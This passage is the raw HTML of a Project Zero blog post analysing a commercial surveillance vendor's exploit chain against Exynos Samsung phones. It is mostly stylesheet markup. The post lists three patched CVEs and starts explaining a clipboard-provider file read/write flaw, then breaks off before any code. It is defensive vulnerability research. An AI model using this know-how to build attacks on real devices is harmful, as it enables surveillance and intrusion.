\"}ol.lst-kix_gtv3l2c5wia7-8{list-style-type:none}.lst-kix_olk2lnn0afau-1&gt;li:before{content:\"\" counter(lst-ctn-kix_olk2lnn0afau-1,lower-latin) \". \"}.lst-kix_gtv3l2c5wia7-0&gt;li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-0}.lst-kix_olk2lnn0afau-2&gt;li:before{content:\"\" counter(lst-ctn-kix_olk2lnn0afau-2,lower-roman) \". \"}.lst-kix_olk2lnn0afau-4&gt;li:before{content:\"\" counter(lst-ctn-kix_olk2lnn0afau-4,lower-latin) \". \"}ol.lst-kix_gtv3l2c5wia7-0{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-1{list-style-type:none}.lst-kix_gtv3l2c5wia7-6&gt;li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-6}.lst-kix_olk2lnn0afau-8&gt;li{counter-increment:lst-ctn-kix_olk2lnn0afau-8}ol.lst-kix_gtv3l2c5wia7-2{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-3{list-style-type:none}.lst-kix_olk2lnn0afau-3&gt;li:before{content:\"\" counter(lst-ctn-kix_olk2lnn0afau-3,decimal) \". \"}ol.lst-kix_gtv3l2c5wia7-4{list-style-type:none}.lst-kix_lsx8wn19rrkf-1&gt;li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-1}.lst-kix_lsx8wn19rrkf-7&gt;li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-7}ol.lst-kix_lsx8wn19rrkf-5.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-5 0}.lst-kix_olk2lnn0afau-2&gt;li{counter-increment:lst-ctn-kix_olk2lnn0afau-2}ol.lst-kix_olk2lnn0afau-8{list-style-type:none}ol.lst-kix_olk2lnn0afau-7{list-style-type:none}.lst-kix_gtv3l2c5wia7-5&gt;li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-5}ol.lst-kix_olk2lnn0afau-6{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-4.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-4 0}.lst-kix_gtv3l2c5wia7-2&gt;li:before{content:\"\" counter(lst-ctn-kix_gtv3l2c5wia7-2,lower-roman) \". \"}.lst-kix_gtv3l2c5wia7-1&gt;li:before{content:\"\" counter(lst-ctn-kix_gtv3l2c5wia7-1,lower-latin) \". \"}.lst-kix_gtv3l2c5wia7-3&gt;li:before{content:\"\" counter(lst-ctn-kix_gtv3l2c5wia7-3,decimal) \". \"}ol.lst-kix_olk2lnn0afau-5.start{counter-reset:lst-ctn-kix_olk2lnn0afau-5 0}.lst-kix_gtv3l2c5wia7-0&gt;li:before{content:\"\" counter(lst-ctn-kix_gtv3l2c5wia7-0,decimal) \". \"}.lst-kix_olk2lnn0afau-6&gt;li:before{content:\"\" counter(lst-ctn-kix_olk2lnn0afau-6,decimal) \". \"}.lst-kix_olk2lnn0afau-8&gt;li:before{content:\"\" counter(lst-ctn-kix_olk2lnn0afau-8,lower-roman) \". \"}ol.lst-kix_lsx8wn19rrkf-4.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-4 0}.lst-kix_olk2lnn0afau-5&gt;li:before{content:\"\" counter(lst-ctn-kix_olk2lnn0afau-5,lower-roman) \". \"}ol.lst-kix_lsx8wn19rrkf-1{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-0{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-3{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-2{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-5{list-style-type:none}.lst-kix_olk2lnn0afau-7&gt;li:before{content:\"\" counter(lst-ctn-kix_olk2lnn0afau-7,lower-latin) \". \"}ol.lst-kix_lsx8wn19rrkf-4{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-7{list-style-type:none}ol.lst-kix_olk2lnn0afau-4.start{counter-reset:lst-ctn-kix_olk2lnn0afau-4 0}ol.lst-kix_lsx8wn19rrkf-6{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-7.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-7 0}.lst-kix_lsx8wn19rrkf-8&gt;li:before{content:\"\" counter(lst-ctn-kix_lsx8wn19rrkf-8,lower-roman) \". \"}ol.lst-kix_lsx8wn19rrkf-8{list-style-type:none}.lst-kix_lsx8wn19rrkf-6&gt;li:before{content:\"\" counter(lst-ctn-kix_lsx8wn19rrkf-6,decimal) \". \"}.lst-kix_x9fpm1r5kf6m-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_lsx8wn19rrkf-7&gt;li:before{content:\"\" counter(lst-ctn-kix_lsx8wn19rrkf-7,lower-latin) \". \"}.lst-kix_lsx8wn19rrkf-0&gt;li:before{content:\"\" counter(lst-ctn-kix_lsx8wn19rrkf-0,decimal) \". \"}.lst-kix_lsx8wn19rrkf-1&gt;li:before{content:\"\" counter(lst-ctn-kix_lsx8wn19rrkf-1,lower-latin) \". \"}ol.lst-kix_olk2lnn0afau-7.start{counter-reset:lst-ctn-kix_olk2lnn0afau-7 0}.lst-kix_x9fpm1r5kf6m-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_lsx8wn19rrkf-2&gt;li:before{content:\"\" counter(lst-ctn-kix_lsx8wn19rrkf-2,lower-roman) \". \"}.lst-kix_x9fpm1r5kf6m-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_x9fpm1r5kf6m-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_lsx8wn19rrkf-4&gt;li:before{content:\"\" counter(lst-ctn-kix_lsx8wn19rrkf-4,lower-latin) \". \"}.lst-kix_lsx8wn19rrkf-5&gt;li:before{content:\"\" counter(lst-ctn-kix_lsx8wn19rrkf-5,lower-roman) \". \"}.lst-kix_x9fpm1r5kf6m-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_lsx8wn19rrkf-3&gt;li:before{content:\"\" counter(lst-ctn-kix_lsx8wn19rrkf-3,decimal) \". \"}.lst-kix_x9fpm1r5kf6m-5&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_olk2lnn0afau-1{list-style-type:none}ol.lst-kix_olk2lnn0afau-0{list-style-type:none}.lst-kix_x9fpm1r5kf6m-0&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_olk2lnn0afau-5{list-style-type:none}ol.lst-kix_olk2lnn0afau-4{list-style-type:none}ol.lst-kix_olk2lnn0afau-3{list-style-type:none}ol.lst-kix_olk2lnn0afau-2{list-style-type:none}.lst-kix_lsx8wn19rrkf-8&gt;li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-8}.lst-kix_gtv3l2c5wia7-8&gt;li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-8}.lst-kix_x9fpm1r5kf6m-2&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_gtv3l2c5wia7-2.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-2 0}.lst-kix_x9fpm1r5kf6m-1&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_x9fpm1r5kf6m-3{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-4{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-1{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-2{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-0{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-5.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-5 0}.lst-kix_olk2lnn0afau-1&gt;li{counter-increment:lst-ctn-kix_olk2lnn0afau-1}ul.lst-kix_x9fpm1r5kf6m-7{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-8{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-5{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-6{list-style-type:none}ul.lst-kix_hbruetvjkelf-4{list-style-type:none}ul.lst-kix_hbruetvjkelf-3{list-style-type:none}ul.lst-kix_hbruetvjkelf-2{list-style-type:none}ul.lst-kix_hbruetvjkelf-1{list-style-type:none}ul.lst-kix_hbruetvjkelf-0{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-2.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-2 0}ol.lst-kix_gtv3l2c5wia7-8.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-8 0}.lst-kix_lsx8wn19rrkf-0&gt;li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-0}ul.lst-kix_hbruetvjkelf-8{list-style-type:none}ul.lst-kix_hbruetvjkelf-7{list-style-type:none}ul.lst-kix_hbruetvjkelf-6{list-style-type:none}ul.lst-kix_hbruetvjkelf-5{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-1.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-1 0}ol.lst-kix_olk2lnn0afau-2.start{counter-reset:lst-ctn-kix_olk2lnn0afau-2 0}.lst-kix_olk2lnn0afau-3&gt;li{counter-increment:lst-ctn-kix_olk2lnn0afau-3}ol.lst-kix_lsx8wn19rrkf-1.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-1 0}.lst-kix_olk2lnn0afau-6&gt;li{counter-increment:lst-ctn-kix_olk2lnn0afau-6}ol.lst-kix_lsx8wn19rrkf-8.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-8 0}ol.lst-kix_gtv3l2c5wia7-7.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-7 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_olk2lnn0afau-0&gt;li{counter-increment:lst-ctn-kix_olk2lnn0afau-0}ol.lst-kix_olk2lnn0afau-1.start{counter-reset:lst-ctn-kix_olk2lnn0afau-1 0}ol.lst-kix_gtv3l2c5wia7-0.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-0 0}.lst-kix_gtv3l2c5wia7-4&gt;li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-4}.lst-kix_gtv3l2c5wia7-1&gt;li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-1}.lst-kix_gtv3l2c5wia7-7&gt;li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-7}ol.lst-kix_olk2lnn0afau-8.start{counter-reset:lst-ctn-kix_olk2lnn0afau-8 0}.lst-kix_lsx8wn19rrkf-3&gt;li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-3}.lst-kix_lsx8wn19rrkf-6&gt;li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-6}ol{margin:0;padding:0}table td,table th{padding:0}.vdnyYxSRCi-c48{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:507.8pt;border-top-color:#e0e0e0;border-bottom-style:solid}.vdnyYxSRCi-c41{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:444.8pt;border-top-color:#e0e0e0;border-bottom-style:solid}.vdnyYxSRCi-c10{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.vdnyYxSRCi-c49{-webkit-text-decoration-skip:none;color:#000000;font-weight:400;text-decoration:line-through;vertical-align:baseline;text-decoration-skip-ink:none;font-family:\"Arial\";font-style:normal}.vdnyYxSRCi-c16{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:\"Arial\";font-style:normal}.vdnyYxSRCi-c32{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:\"Arial\";font-style:normal}.vdnyYxSRCi-c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,\"Courier New\";font-style:normal}.vdnyYxSRCi-c31{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:\"Arial\";font-style:normal}.vdnyYxSRCi-c7{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.vdnyYxSRCi-c35{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\"}.vdnyYxSRCi-c17{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.vdnyYxSRCi-c52{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.vdnyYxSRCi-c28{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.vdnyYxSRCi-c0{font-size:10pt;font-family:Consolas,\"Courier New\";color:#616161;font-weight:400}.vdnyYxSRCi-c30{padding-top:0pt;padding-bottom:0pt;line-height:1.38;text-align:left}.vdnyYxSRCi-c5{font-size:10pt;font-family:Consolas,\"Courier New\";color:#9c27b0;font-weight:400}.vdnyYxSRCi-c47{margin-left:0.8pt;border-spacing:0;border-collapse:collapse;margin-right:auto}.vdnyYxSRCi-c13{font-size:10pt;font-family:Consolas,\"Courier New\";color:#c53929;font-weight:400}.vdnyYxSRCi-c20{font-size:10pt;font-family:Consolas,\"Courier New\";color:#455a64;font-weight:400}.vdnyYxSRCi-c24{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.vdnyYxSRCi-c4{font-size:10pt;font-family:Consolas,\"Courier New\";color:#000000;font-weight:400}.vdnyYxSRCi-c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.vdnyYxSRCi-c12{font-size:10pt;font-family:Consolas,\"Courier New\";color:#3367d6;font-weight:400}.vdnyYxSRCi-c43{color:#222222;font-weight:400;font-size:11pt;font-family:\"Arial\"}.vdnyYxSRCi-c23{border-spacing:0;border-collapse:collapse;margin-right:auto}.vdnyYxSRCi-c34{color:#000000;font-weight:400;font-size:11pt;font-family:Consolas,\"Courier New\"}.vdnyYxSRCi-c18{font-size:10pt;font-family:Consolas,\"Courier New\";color:#0f9d58;font-weight:400}.vdnyYxSRCi-c25{font-size:10pt;font-family:Consolas,\"Courier New\";color:#00796b;font-weight:400}.vdnyYxSRCi-c42{color:#434343;font-weight:400;font-size:14pt;font-family:\"Arial\"}.vdnyYxSRCi-c2{font-family:Consolas,\"Courier New\";color:#0d904f;font-weight:400}.vdnyYxSRCi-c27{-webkit-text-decoration-skip:none;text-decoration:underline;text-decoration-skip-ink:none}.vdnyYxSRCi-c33{text-decoration:none;vertical-align:baseline;font-style:normal}.vdnyYxSRCi-c37{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.vdnyYxSRCi-c51{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;text-decoration:line-through}.vdnyYxSRCi-c21{margin-left:36pt;padding-left:0pt}.vdnyYxSRCi-c6{color:inherit;text-decoration:inherit}.vdnyYxSRCi-c46{font-weight:400;font-family:Consolas,\"Courier New\"}.vdnyYxSRCi-c36{padding:0;margin:0}.vdnyYxSRCi-c8{orphans:2;widows:2}.vdnyYxSRCi-c26{margin-left:36pt;text-indent:36pt}.vdnyYxSRCi-c45{text-decoration:none;vertical-align:baseline}.vdnyYxSRCi-c9{background-color:#ffff00}.vdnyYxSRCi-c15{background-color:#b6d7a8}.vdnyYxSRCi-c29{background-color:#f4cccc}.vdnyYxSRCi-c11{font-style:italic}.vdnyYxSRCi-c19{height:0pt}.vdnyYxSRCi-c14{height:11pt}.vdnyYxSRCi-c44{font-size:11pt}.vdnyYxSRCi-c22{height:52.5pt}.vdnyYxSRCi-c40{font-weight:700}.vdnyYxSRCi-c39{margin-left:36pt}.vdnyYxSRCi-c38{background-color:#ffffff}.vdnyYxSRCi-c50{color:#222222}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c37 doc-content\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c35 vdnyYxSRCi-c11\"&gt;Posted by Maddie Stone, Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c35 vdnyYxSRCi-c11\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c11 vdnyYxSRCi-c40\"&gt;Note&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c35 vdnyYxSRCi-c11\"&gt;: The three vulnerabilities discussed in this blog were all fixed in Samsung&amp;rsquo;s March 2021 release. They were fixed as CVE-2021-25337, CVE-2021-25369, CVE-2021-25370. To ensure your Samsung device is up-to-date under settings you can check that your device is running SMR Mar-2021 or later.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;As defenders, in-the-wild exploit samples give us important insight into what attackers are really doing. We get the &amp;ldquo;ground truth&amp;rdquo; data about the vulnerabilities and exploit techniques they&amp;rsquo;re using, which then informs our further research and guidance to security teams on what could have the biggest impact or return on investment. To do this, we need to know that the vulnerabilities and exploit samples were found in-the-wild. &lt;/span&gt;&lt;span&gt;Over the past few years there&amp;rsquo;s been tremendous progress in vendor&amp;rsquo;s transparently disclosing when a vulnerability is known to be exploited in-the-wild: &lt;/span&gt;&lt;span&gt;Adobe, Android, Apple, ARM, Chrome, &lt;/span&gt;&lt;span&gt;Microsoft, &lt;/span&gt;&lt;span&gt;Mozilla, and others are sharing this information via their security release note&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;s.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;While&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;we understand that Samsung has yet to annotate any vulnerabilities as in-the-wild, going forward, Samsung has committed to publicly sharing when vulnerabilities may be under limited, targeted exploitation, as part of their release notes. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;We hope that, like Samsung, others will join their industry peers in disclosing when there is evidence to suggest that a vulnerability is being exploited in-the-wild in one of their products. &lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"vdnyYxSRCi-c28 vdnyYxSRCi-c8\" id=\"h.a4kixp1dzrny\"&gt;&lt;span&gt;The exploit sample&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The Google Threat Analysis Group (TAG) obtained a partial exploit chain for Samsung devices that TAG believes belonged to a commercial surveillance vendor. These exploits were likely discovered in the testing phase. &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;The sample is from late 2020. The chain merited further analysis because it is a 3 vulnerability chain where all 3 vulnerabilities are within Samsung custom components, including a vulnerability in a Java component. This exploit analysis was completed in collaboration with Clement Lecigne from TAG.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The sample used three vulnerabilities, all patched in March 2021 by Samsung: &lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c36 lst-kix_lsx8wn19rrkf-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;Arbitrary file read/write via the clipboard provider - CVE-2021-25337&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span&gt;Kernel information leak via &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sec_log&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;- CVE-2021-25369&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;Use-after-free in the Display Processing Unit (DPU) driver - CVE-2021-25370&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;The exploit sample targets Samsung phones running kernel 4.14.113 with the Exynos SOC. Samsung phones run one of two types of SOCs depending on where they&amp;rsquo;re sold. For example the Samsung phones sold in the United States, China, and a few other countries use a Qualcomm SOC and phones sold most other places (ex. Europe and Africa) run an Exynos SOC. The exploit sample relies on both the Mali GPU driver and the DPU driver which are specific to the Exynos Samsung phones.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;Examples of Samsung phones that were running kernel 4.14.113 in late 2020 (when this sample was found) include the S10, A50, and A51.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The in-the-wild sample that was obtained is a JNI native library file that would have been loaded as a part of an app. Unfortunately TAG did not obtain the app that would have been used with this library. Getting initial code execution via an application is a path that we&amp;rsquo;ve seen in other campaigns this year. &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://blog.google/threat-analysis-group/italian-spyware-vendor-targets-users-in-italy-and-kazakhstan/\"&gt;TAG&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://googleprojectzero.blogspot.com/2022/06/curious-case-carrier-app.html\"&gt;Project Zero&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;published detailed analyses of one of these campaigns in June. &lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"vdnyYxSRCi-c28 vdnyYxSRCi-c8\" id=\"h.e0me6pgei4ix\"&gt;&lt;span class=\"vdnyYxSRCi-c31\"&gt;Vulnerability #1 - Arbitrary filesystem read and write&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The exploit chain used CVE-2021-25337 for an initial arbitrary file read and write. The exploit is running as the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;untrusted_app&lt;/span&gt;&lt;span&gt;&amp;nbsp;SELinux context, but uses the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_server&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;SELinux context to open files that it usually wouldn&amp;rsquo;t be able to access. This bug was due to a lack of access control in a custom Samsung clipboard provider that runs as the system user. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrMtDmG4HptsA4AWfg404rrysHRNHsnGwDE6LY1iWCH2ywFNiQy4qn6yuV9ONlcJ2_YilTV8pd1um42sMKqVhKQliJWco-ZF9Vq0z24fCavXMMcM6jsFLP-JDuw726K7zXOtvC5Cb4K_bWcNUkl3Y2hlWwiIGS0FOjkJNG1oWDSQ7bc9RGm6ZUQXN/s1104/image2.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrMtDmG4HptsA4AWfg404rrysHRNHsnGwDE6LY1iWCH2ywFNiQy4qn6yuV9ONlcJ2_YilTV8pd1um42sMKqVhKQliJWco-ZF9Vq0z24fCavXMMcM6jsFLP-JDuw726K7zXOtvC5Cb4K_bWcNUkl3Y2hlWwiIGS0FOjkJNG1oWDSQ7bc9RGm6ZUQXN/s1104/image2.png\" border=\"0\" alt=\"Screenshot of the CVE-2021-25337 entry from Samsung&amp;#39;s March 2021 security update. It reads: &amp;amp;quot;SVE-2021-19527 (CVE-2021-25337): Arbitrary file read/write vulnerability via unprotected clipboard content provider &amp;nbsp;Severity: Moderate Affected versions: P(9.0), Q(10.0), R(11.0) devices except ONEUI 3.1 in R(11.0) Reported on: November 3, 2020 Disclosure status: Privately disclosed. An improper access control in clipboard service prior to SMR MAR-2021 Release 1 allows untrusted applications to read or write arbitrary files in the device. The patch adds the proper caller check to prevent improper access to clipboard service.\" style=\"max-height: 750px; max-width: 600px;\"title=\"Screenshot of the CVE-2021-25337 entry from Samsung&amp;#39;s March 2021 security update. It reads: &amp;amp;quot;SVE-2021-19527 (CVE-2021-25337): Arbitrary file read/write vulnerability via unprotected clipboard content provider &amp;nbsp;Severity: Moderate Affected versions: P(9.0), Q(10.0), R(11.0) devices except ONEUI 3.1 in R(11.0) Reported on: November 3, 2020 Disclosure status: Privately disclosed. An improper access control in clipboard service prior to SMR MAR-2021 Release 1 allows untrusted applications to read or write arbitrary files in the device. The patch adds the proper caller check to prevent improper access to clipboard service.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"vdnyYxSRCi-c17 vdnyYxSRCi-c8\" id=\"h.6kvrbnoz6uxg\"&gt;&lt;span class=\"vdnyYxSRCi-c16\"&gt;About Android content providers&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"vdnyYxSRCi-c1 